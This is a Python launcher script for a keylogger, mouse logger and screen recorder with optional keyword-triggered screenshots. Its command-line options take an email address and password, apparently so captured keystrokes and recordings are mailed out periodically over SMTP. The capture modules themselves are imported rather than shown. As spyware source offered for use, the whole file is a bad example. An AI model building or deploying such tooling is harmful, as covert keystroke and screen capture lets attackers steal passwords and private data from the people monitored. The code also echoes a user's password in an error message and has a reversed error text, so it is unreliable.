import argparse, threading
from Handlers.Keyboard_Handler import KeyLogger
from Handlers.Mouse_Handler import MouseHandle
from Combine.Handler import Handle_Mouse_Keyboard
from Combine.Scrn_Handler import Handle_Mouse_keyboard_Scrn
from Recorders.Screen_Recorder import Scrn_Recorder
import smtplib

# ----------------------------------------------
#   CREATE ARGUMENTS FOR COMMAND LINE INTERFACE
# ----------------------------------------------
parser = argparse.ArgumentParser()
parser.add_argument('--keylisten', '-K', nargs='?', const=1, help="Keyboard Listener (Store Key Strokes)")
parser.add_argument('--mouselisten', '-M', nargs='?', const=1, help="Mouse Listener (Store Mouse Actions)")
parser.add_argument('--keymouselisten', '-L', nargs='?', const=1, help=" Keyboard and Mouse Listener (Store Key Strokes and Mouse Actions)")
parser.add_argument('--recordscreen', '-r', nargs='?', const=1, help="Screen Recorder")
parser.add_argument('--keymousescrnrec', '-R', nargs='?', const=1, help=" Record Screen Along with Keyboard and Mouse Actions")
parser.add_argument('--email', '-e', nargs='?', const=1, help="User Email Address")
parser.add_argument('--password', '-p', nargs='?', const=1, help="User Email Password")
parser.add_argument('--fps', '-F', nargs='?', const=1, help="Frames Per Second")
parser.add_argument('--capture', '-c', nargs='?', const=1, help="Capture Screen Set True / False")
parser.add_argument('--capturetime', '-t', nargs='?', const=1, help="Capture Screen Set True / False")
parser.add_argument('--mailduration', '-D', nargs='?', const=1, help="Capture Screen Set True / False")
parser.add_argument('--stop', '-S', nargs='?', const=1, help="Stops the Program execution based on give time in seconds")
args = parser.parse_args()

# ------------------------------------------
#   ACTIVATE ONLY KEY LISTENER / KEYLOGGER
# ------------------------------------------
if args.keylisten == 1 and args.email != None and args.password != None and args.mailduration != None and args.stop != None:
    try:
        kl = KeyLogger(email=args.email, password=args.password, time_interval=int(args.mailduration), terminate=int(args.stop))
        kl.run()
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)

# -------------------------------------------------
#   ACTIVATE ONLY MOUSER LISTENER / MOUSER LOGGER
# -------------------------------------------------
if args.mouselisten == 1 and args.email != None and args.password != None and args.mailduration != None and args.stop != None:
    try:
        mh = MouseHandle(email=args.email, password=args.password, time_interval=int(args.mailduration), terminate=int(args.stop))
        mh.run()
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)

# -----------------------------------------
#   ACTIVATE KEY LOGGER AND MOUSE LOGGER
# -----------------------------------------
if args.keymouselisten == 1 and args.email != None and args.password != None and args.mailduration != None and args.capture != 1 and args.stop != None:
    try:
        mh = Handle_Mouse_Keyboard(email=args.email, password=args.password, time_interval=int(args.mailduration), capture=False, terminate=int(args.stop))
        mh.run()
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)

# ----------------------------------------------------------------------------------
#   ACTIVATE KEY LOGGER AND MOUSER LOGGER ALONG WITH SCREEN SHOTS BASED ON KEYWORDS
# ----------------------------------------------------------------------------------
if args.keymouselisten == 1 and args.email != None and args.password != None and args.mailduration != None and args.capture == 1 and args.stop != None:
    try:
        mh = Handle_Mouse_Keyboard(email=args.email, password=args.password, time_interval=int(args.mailduration), capture=True, terminate=int(args.stop))
        mh.run()
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)

# ---------------------------------
#   ACTIVATE SCREEN RECORDER
# ---------------------------------
if args.recordscreen == 1 and args.email != None and args.password != None and args.capturetime != None and args.fps != None:
    try:
        Srn = Scrn_Recorder(args.email, args.password, args.capturetime, args.fps)
        Srn.get_record()
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)

# -------------------------------------------------------
#   ACTIVATE KEY LOGGER, MOUSER LOGGER, SCREEN RECORDER
# -------------------------------------------------------
if args.keymousescrnrec == 1 and args.email != None and args.password != None and args.mailduration != None and args.capturetime != None and args.fps != None and args.capture != 1 and args.stop != None:
    try:
        if int(args.capturetime) < int(args.stop):
            cd = Handle_Mouse_keyboard_Scrn(email=args.email, password=args.password, mail_time=int(args.mailduration), record_time=int(args.capturetime), fps=int(args.fps), capture=False, terminate=int(args.stop))
            t1 = threading.Thread(target=cd.get_record)
            t1.start()
            cd.run()
        else:
            print('[-] Capture time should be greater than stop time')
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)

# -----------------------------------------------------------------------
#   ACTIVATE KEY LOGGER, MOUSER LOGGER, SCREEN RECORDER AND SCREEN SHOTS
# -----------------------------------------------------------------------
if args.keymousescrnrec == 1 and args.email != None and args.password != None and args.mailduration != None and args.capturetime != None and args.fps != None and args.capture == 1 and args.stop != None:
    try:
        if int(args.capturetime) < int(args.stop):
            cd = Handle_Mouse_keyboard_Scrn(email=args.email, password=args.password, mail_time=int(args.mailduration), record_time=int(args.capturetime), fps=int(args.fps), capture=True, terminate=int(args.stop))
            t1 = threading.Thread(target=cd.get_record)
            t1.start()
            cd.run()
        else:
            print('[-] Capture time should be greater than stop time')
    except TimeoutError:
        print('[-] Unable to Connect to Internet: Time out Error')
    except smtplib.SMTPAuthenticationError:
        print('[-] Authentication Problem --> check the details provided\nYour Previous details: Email - '+args.email+'\nPassword - '+args.password)